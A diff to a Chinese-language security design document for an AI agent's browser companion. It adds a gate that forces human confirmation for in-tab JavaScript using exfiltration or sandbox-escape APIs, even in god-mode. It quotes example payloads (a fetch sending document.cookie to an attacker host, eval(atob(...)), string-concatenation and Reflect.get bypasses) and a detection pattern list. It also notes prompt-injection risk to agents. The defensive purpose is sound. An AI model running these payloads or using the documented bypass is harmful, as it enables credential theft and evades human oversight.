@@ -102,8 +102,8 @@ skipL2 = auto_approve_dangerous || allow_all_schemes    // Layer 2（含 evaluat
 | 类 | 工具 | 当前门 | 归属阶梯 |
 |---|---|---|---|
 | 浏览器导航 | navigate/create_tab/set_tab_url | L1+L2 | 已在阶梯 |
-| 脚本执行 | evaluate | L2（per-domain 白名单） | 已在 |
-| 宿主脚本 | osascript_eval | L2（仅全局 toggle） | 已在（保持） |
+| 脚本执行 | evaluate | L2（per-domain 白名单）+ §6.2 critical 覆盖 | 已在 |
+| 宿主脚本 | osascript_eval | L2（仅全局 toggle）+ §6.2 critical 覆盖 | 已在（保持） |
 | **任意 URL 读取** | **analyze_image**（读任意 URL，可打内网/泄露） | **§6.1 IMAGE_FETCH_GATE** | **独立门（L2 确认家族，god-mode 不绕过）** |
 | Cookie | get/set/delete/list_cookies | trusted_domains 门 | 已在（cookie 门） |
 | MCP | mcp_list_resources/read_resource/get_prompt | 无门（实际工具调用走 MCP server） | **待定：MCP 工具调用是否入 L2** |
@@ -213,6 +213,121 @@ candidate_url 判定顺序：
 ### 6.1.9 实现
 
 单 PR（**不拆 D1/D2**）：§6.1 本节 + companion IMAGE_FETCH_GATE + 两阶段协议 + 扩展两阶段接线 + UI 文案 + 测试。协议变更触及 companion/扩展两端，**必须原子合并**（拆 PR 会有「companion 已两阶段、扩展仍旧」的破损窗口）。
+
+---
+
+## 6.2 JS capability 边界门（CRITICAL_API_GATE）— M3'
+
+> **代码基线（main 8794b57，已逐条核对 file:line）**：确认门 `companion/src/server.ts:273-363`（`createToolExecutor` 内，evaluate+osascript_eval 共享）；god-mode 跳过点 `server.ts:297-299`；危险 API 检测 `companion/src/security.ts:155-221`（`DANGEROUS_API_PATTERNS` 共 57 条）+ `checkHighRiskExecution`（`security.ts:243`）；token 绑定 `securityPolicy.issueToken/validateToken`；osascript_eval 执行 `executeCompanionTool` case `server.ts:958-1023`（固定 AppleScript 模板 `execute t javascript jsExpr`）。工具定义 `tool-definitions.ts:486-496`（「Execute JavaScript in a Chrome tab via AppleScript. LAST RESORT for strict-CSP pages」）。
+
+### 6.2.1 风险模型 — evaluate / osascript_eval 都是 JS-in-tab
+
+**前提纠正**（kimi #M3 初稿误判为「任意 AppleScript = 钥匙串/文件系统」，主会话 push-back 后 kimi 复核确认）：osascript_eval **不是任意 AppleScript**。其 AppleScript 是固定硬编码模板（`server.ts:990-1011`），唯一变量是经 argv 安全传入的 `jsExpr`——一个 **JavaScript 表达式**，在匹配 URL 的 Chrome tab 内经 `execute t javascript` 执行（绕 CSP + debugger）。模板**不暴露 `do shell script`/keychain/Finder**，能力边界 = 「在已打开 Chrome tab 内执行任意 JS」。
+
+evaluate（`server.ts:365` 注释「forwarded to the extension」）经扩展 API 在 tab 内执行 JS，同样受限于浏览器 tab 上下文。两者共享同一 L2 确认门（`server.ts:273`：`toolName === "evaluate" || "osascript_eval"`）。
+
+**真实缺口**——`server.ts:297-299` 的 `skipConfirmation`：
+```js
+const skipConfirmation = securityConfig.auto_approve_dangerous === true
+  || securityConfig.allow_all_schemes === true       // god-mode
+  || (relevantDomain !== "" && isAutoApprovedDomain(relevantDomain))
+```
+god-mode / auto_approve_dangerous 一开 → `skipConfirmation=true` → **整个 273-363 确认块被跳过** → `checkHighRiskExecution` 的 57 条危险 API 检测**根本不跑** → 任何 exfil/escape payload（`fetch(attacker,{body:document.cookie})` / `eval(atob(...))` / `new Image().src=...`）**零确认**在 tab 内执行。
+
+god-mode 用户开启本意为「放行导航/调试内嵌页」，不应等同「放行数据外泄 + 沙箱逃逸 JS payload」。这正是「god-mode 跳确认但不扩能力边界」原则（§6.1.5）在 JS-in-tab 场景的真实落地位置。
+
+### 6.2.2 critical-never-auto 子集
+
+从现有 57 条 `DANGEROUS_API_PATTERNS` 中标记 **critical-never-auto 子集**（不新建平行列表，单一真相源）。在 pattern 对象加 `critical?: boolean` 字段。**kimi 终审 NEEDS-FIX 后修订**：补 `setTimeout(string)`/`setInterval(string)`（eval 等价）、`Worker`/`SharedWorker`（持久外泄通道）、`Reflect.apply`/`Reflect.construct`（动态调用任意 fn），并新增 `bracket-eval`/`bracket-Function` 两条 pattern 关闭 `window["eval"]`/`window["Function"]` 绕过：
+
+| 类 | 代表 pattern | 理由 |
+|---|---|---|
+| **exfil（数据外泄）** | `fetch` / `XMLHttpRequest` / `document.cookie` / `localStorage` / `sessionStorage` / `navigator.sendBeacon` / `image-src-exfil` / `RTCPeerConnection` / `WebSocket` / `navigator.clipboard` / `Worker` / `SharedWorker` | 主动外发或读取页面凭据/存储；`Worker`/`SharedWorker` 可在独立上下文 `fetch`/`WebSocket`，是持久化外泄通道 → 经 LLM 通道外泄 |
+| **escape（沙箱逃逸/动态代码）** | `eval` / `Function` / `Proxy` / `constructor` / `__proto__` / `prototype-pollution` / `atob-function` / `dynamic-import` / `comma-eval` / `setTimeout(string)` / `setInterval(string)` / `Reflect.apply` / `Reflect.construct` | 动态代码生成/反射逃逸。`setTimeout("...")`/`setInterval("...")` 字符串参数 = eval 等价；`Reflect.apply`/`Reflect.construct` 可动态调用任意 fn（含 `fetch`/`Function`），是逃逸原语 |
+| **obfuscation 变体** | `bracket-fetch` / `bracket-cookie` / `bracket-localStorage` / `bracket-sessionStorage` / `bracket-sendBeacon` / `bracket-XMLHttpRequest` / `fetch.call` / `fetch.apply` / **`bracket-eval`（新）** / **`bracket-Function`（新）** | 上述 exfil/escape 能力的混淆形态（`window["fetch"](...)` / `window["eval"](...)` 等）→ 继承 critical |
+
+**非 critical（普通 dangerous，god-mode 仍可跳过）**：DOM 注入类（`innerHTML`/`appendChild`/`document.write`）、`window.open`/`location` 跳转、`postMessage`、`indexedDB`、`EventSource`、`globalThis-index`、`reflect-get`、`bracket-open`/`bracket-indexedDB` 等——`globalThis-index`/`reflect-get` 故意保持非 critical：它们匹配任意动态属性访问（`window["myApp"]`/`Reflect.get(obj,key)`），误伤面大；其危险具体目标（`window["fetch"]`/`window["eval"]`/`window["Function"]`）已由 `bracket-fetch`/`bracket-eval`/`bracket-Function` 等 critical 变体覆盖。`Reflect.get(window,"eval")` 形态为已接受残留风险（见 §6.2.7）。
+
+> **对 `Reflect.apply`/`Reflect.construct` 取整 pattern critical（而非 kimi 建议的精确子模式）的理由**：精确子模式（如 `Reflect\.apply\s*\(\s*fetch`）是 regex 军备竞赛的假精度——`Reflect.apply(globalThis["fetch"],...)` / `Reflect.apply(window['fe'+'tch'],...)` 可绕过任何有限枚举。取整 pattern critical 更诚实：`Reflect.apply`/`Reflect.construct` 是动态调用原语，在 evaluate/osascript_eval 页面自动化上下文里良性用法罕见，误伤可经 security_token 重放消解。
+
+新增 `detectCriticalApis(code): string[]` = `DANGEROUS_API_PATTERNS.filter(p => p.critical && p.pattern.test(code)).map(p => p.name)`。critical 子集是 `dangerousApis` 的子集（同表过滤）。
+
+### 6.2.3 门 — 不可跳过分支
+
+在 `server.ts:273-363` 确认块内、`skipConfirmation` 判定**之后**插入 critical 检查（伪码）：
+```js
+const safety = checkHighRiskExecution(toolName, code)
+const criticalApis = detectCriticalApis(code)
+const forceConfirm = criticalApis.length > 0   // critical 命中 → 即便 skipConfirmation 也强制确认
+if (!skipConfirmation || forceConfirm) {
+  // 走现有 securityConfirmations.request 流程
+  // dangerousApis = safety.dangerousApis（含 critical + 普通，供风险预览）
+  // 新增透传 criticalApis 给 UI 高亮
+  ...
+}
+```
+- `skipConfirmation && !forceConfirm`：维持现状（普通 dangerous，auto-approve/god-mode 跳过），记现有 `security.auto_approved`。
+- `forceConfirm`：即便 god-mode/auto_approve/domain-whitelist，仍弹确认。`securityConfirmations.request` 传 `dangerousApis: safety.dangerousApis`（含 critical + 普通）；新增 `criticalApis` 字段透传；`forceConfirm` 时一并设 `riskLevel:"high"` + `autoConfirmEligible:false`（`SecurityConfirmationDetails` 现有字段 `security-confirmation.ts:15-16`），让现有扩展 UI 即使不升级也能渲染为高优先级、不提供「同线程自动确认」。确认后照常 `issueToken`（重放同一 code 不再确认，现有机制不破坏）。
+
+### 6.2.4 god-mode / auto_approve / domain whitelist 非绕过（镜像 §6.1.5）
+
+**三者均不绕过 critical-never-auto 子集。** 理由：
+- god-mode 语义 = 放行导航/调试（L1 scheme + L2 确认），不是放行数据外泄/沙箱逃逸。
+- critical exfil/escape payload 一旦在 tab 内执行，泄露的凭据/数据经 LLM 通道不可撤回（与 §6.1.5 fetch SSRF 同性质：数据外泄不可逆）。
+- 镜像 §6.1.5：`allow_all_schemes`/`auto_approve_dangerous` 对 IMAGE_FETCH_GATE 无效 → 此处对 CRITICAL_API_GATE 同样无效。
+- **domain whitelist 也不绕过**：trusted domain 不代表页面内容可信（prompt 注入可在 trusted 页面注入 hostile JS）。`forceConfirm` 只看 `criticalApis.length > 0`，不看 domain。
+- **行为变更说明**：domain whitelist 此前对 evaluate 的所有 dangerous API 生效（含外泄类）；修订后 whitelist **仅对非 critical 的 dangerous API** 生效（DOM 注入/导航/`postMessage` 等）。这不是破坏契约，而是纠正「信任域名 = 信任代码」的误解——与 §6.1.5 把 god-mode/auto_approve 排除在 fetch 门外的原则同源。UI 文案/`TROUBLESHOOTING` 需补一句「critical 能力（数据外泄/沙箱逃逸）即便对 trusted domain 仍需确认」。
+
+### 6.2.5 审计事件
+
+| 事件 | level | 触发 | 字段 |
+|---|---|---|---|
+| `security.critical_capability_confirmed` | info | critical 命中 + 用户确认放行 | `tool_call_id`, `tool_name`, `critical_apis: string[]`, `god_mode_active: bool`, `auto_approve_active: bool`, `relevant_domain: string` |
+| `security.critical_capability_denied` | warn | critical 命中 + 用户拒绝/超时/断开 | 同上 + `reason` |
+| `security.critical_capability_token_replay` | info | token 重放路径 + 重算 `criticalApis.length>0`（仅当命中才打） | `tool_call_id`, `tool_name`, `critical_apis: string[]`, `god_mode_active: bool`, `auto_approve_active: bool` |
+
+命名 snake_case（与现有 `security.confirmation.requested`/`security.auto_approved` 一致）。`god_mode_active`=`allow_all_schemes===true`；`auto_approve_active`=`auto_approve_dangerous===true`（两者可同时 true，god-mode ⊇ auto-approve）；`relevant_domain` 对 evaluate 取 tab 域、对 osascript_eval 取 `""`（与 `server.ts:291-293` 一致）。普通 dangerous 被 god-mode 跳过仍记现有 `security.auto_approved`（reason=god_mode/global_toggle/domain_whitelist），不变。`token_replay` 事件非安全门（token 已绑定 code=已确认过），仅为可观测/溯源——**仅在 `server.ts` evaluate token 重放路径**（`else if (toolName === "evaluate" && security_token)` 分支，即 agent 携预存 token 跳过 273-363 门时）重算 `detectCriticalApis`，命中才打。osascript_eval 不另设 replay 日志：其 token 总在本次 `createToolExecutor` 273-363 门内签发并立即于 `executeCompanionTool:958` 验证，首次执行与重放不可区分，由 273-363 forceConfirm 门统摄；`message-router.ts` 的 osascript_eval case 路由至 `session.executeTool`(= createToolExecutor)，同一门覆盖，且该 case 无发送方（agent 主路径不走 message-router）。
+
+### 6.2.6 适用范围与调用链覆盖
+
+仅 `evaluate` + `osascript_eval`（`server.ts:273` 已限定两者，共享确认门）。其他工具不涉及 JS-in-tab，不引入 critical 概念。
+
+**调用链覆盖**（已核对）：①agent 主路径 adapter → `createToolExecutor`(273-363) → `executeCompanionTool`；②message-router 无 token 路径（`message-router.ts:1271`）→ `session.executeTool`（= `createToolExecutor` 注入的回调，经 273-363）；③message-router 带 token 路径（token = 已确认 issue，不重复确认）。**patch 273-363 一处即覆盖全部 agent 可达路径。**
+
+### 6.2.7 残留风险
+
+- **JS 静态分析上限**：regex 检测可被 obfuscation 绕（`window["ev"+"al"]`、`String.fromCharCode` 构造、`Reflect.get(window,atob("ZXZhbA=="))`）。检测能力固有上限，非门设计缺陷。`comma-eval`/`atob-function`/`bracket-*`（含新 `bracket-eval`/`bracket-Function`）等 pattern 已覆盖常见绕过形态；critical 命中即强制确认已显著抬高门槛。完整 JS 沙箱需 AST + 运行时拦截（P4 范畴）。
+- **`Reflect.get` 残留**：`globalThis-index`/`reflect-get` 保持非 critical（误伤面大），其危险具体目标由 `bracket-*` critical 覆盖；`Reflect.get(window,"eval")` 形态不被任何 critical pattern 命中 → god-mode 下可绕过。接受此残留：`Reflect.get` 读取属性是常见良性模式，取整 critical 误伤过重；该具体绕过形态冷僻，已由 §6.2.7 首条的 regex 上限统摄。
+- **误报代价**：critical 子集（exfil+escape+动态调用原语）在 evaluate/osascript_eval 页面自动化上下文良性命中罕见；合法 unattended 工作流若需 `fetch` 同源 API 会被强制确认——这是 god-mode 下「数据外泄需人在环」的预期代价，非 bug。确认后可用 security_token 重放同 code（现有机制）。
+- **`do shell script` 纵深不变量**：当前 osascript_eval 模板不暴露 `do shell script`，但若未来有人改模板引入即 game-over。本 PR 在模板处加注释标注不变量：「NEVER introduce `do shell script` / `tell application "Finder"` / keychain into this template — would break the JS-in-tab capability boundary assumed by §6.2」。
+
+### 6.2.8 注释修正
+
+`server.ts:285-286` 现注释错误称 osascript_eval 执行「host AppleScript (arbitrary shell access)」，与代码事实（固定模板 `execute t javascript`）矛盾。修正为：「fixed AppleScript wrapper that only executes the supplied JS expression inside a Chrome tab via `execute t javascript` — NOT arbitrary host AppleScript (no `do shell script`/keychain/Finder). See §6.2 for the JS-capability boundary.」
+
+### 6.2.9 测试矩阵
+
+| 用例 | 期望 |
+|---|---|
+| god-mode + 普通 dangerous（`innerHTML=`） | `auto_approved`(reason=god_mode)，不弹确认 |
+| god-mode + critical exfil（`fetch(...)`） | 弹确认；`critical_capability_confirmed`/`denied`，`god_mode_active=true` |
+| god-mode + `Reflect.apply(fetch, ...)` | 弹确认（`Reflect.apply` critical，闭合绕过） |
+| god-mode + `setTimeout("fetch(...)", 1000)` | 弹确认（`setTimeout(string)` critical） |
+| god-mode + `new Worker("data:...")` | 弹确认（`Worker` critical） |
+| god-mode + `window["eval"](...)` | 弹确认（`bracket-eval` critical） |
+| god-mode + `globalThis["myApp"]` | `auto_approved`（`globalThis-index` 非 critical，无误伤） |
+| auto_approve + critical escape（`eval(...)`） | 弹确认（不被 auto_approve 跳过） |
+| trusted domain + critical | 弹确认（domain 不绕过 critical），`relevant_domain` 记录该域 |
+| 非 god-mode + critical | 弹确认（现有行为，回归） |
+| 非 god-mode + 无 dangerous | 不弹（现有行为，回归） |
+| 用户拒绝 critical | `critical_capability_denied`，返回 `Security Block` |
+| evaluate 与 osascript_eval 行为一致 | 两者 critical 命中均强制确认 |
+| security_token 重放同 critical code | token 有效则放行 + 打 `critical_capability_token_replay`（现有机制不破坏） |
+| token 重放时改 code | `validateToken` 失败 → 回无 token → 再弹 critical 确认 |
+
+### 6.2.10 实现
+
+单 PR：§6.2 本节 + `security.ts` `critical` 字段 + 2 条新 pattern（`bracket-eval`/`bracket-Function`）+ `detectCriticalApis` + `server.ts` 273-363 不可跳过分支（`forceConfirm` + `riskLevel:"high"`/`autoConfirmEligible:false`）+ 审计事件（含 `token_replay`）+ `server.ts:285-286` 注释修正 + osascript_eval 模板不变量注释 + 测试。**companion-only**——无破坏性协议变更：`SecurityConfirmationDetails` 新增可选 `criticalApis?: string[]` 字段、`security.confirmation.request` payload 新增 `critical_apis`，旧扩展 UI 忽略未知字段（向后兼容）；扩展端可后续消费做高亮，本 PR 不强制。可原子合并。
 
 ---
 
